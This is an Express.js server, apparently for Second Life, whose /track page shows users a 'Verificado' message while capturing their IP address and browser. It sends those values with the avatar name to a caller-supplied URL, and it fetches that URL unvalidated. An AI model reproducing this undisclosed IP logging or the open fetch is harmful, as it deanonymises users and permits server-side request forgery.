const express = require("express");

const app = express();
const PORT = process.env.PORT || 10000;

app.get("/", (req, res) => {
  res.send("Servidor online.");
});

app.get("/track", async (req, res) => {
  const avatar = req.query.avatar || "";
  const nome = req.query.nome || "";
  const primurl = req.query.primurl || "";

  const forwarded = req.headers["x-forwarded-for"] || "";
  const ip =
    forwarded.split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "desconhecido";

  const navegador = req.headers["user-agent"] || "desconhecido";

  if (primurl) {
    const retorno =
      primurl +
      "?acao=retorno" +
      "&avatar=" + encodeURIComponent(avatar)
      + "&nome=" + encodeURIComponent(nome)
      + "&ip=" + encodeURIComponent(ip)
      + "&navegador=" + encodeURIComponent(navegador);

    try {
      await fetch(retorno);
    } catch (e) {
      console.log("Erro ao retornar para o prim:", e.message);
    }
  }

  res.setHeader("Content-Type", "text/html; charset=utf-8");

  res.send(`
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Verificado</title>
</head>
<body style="margin:0;min-height:100vh;background:#08111f;color:white;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;text-align:center;">
  <div>
    <h1>✅ Verificado</h1>
    <p>Você já pode voltar ao Second Life.</p>
  </div>
</body>
</html>
  `);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log("Servidor rodando na porta " + PORT);
});
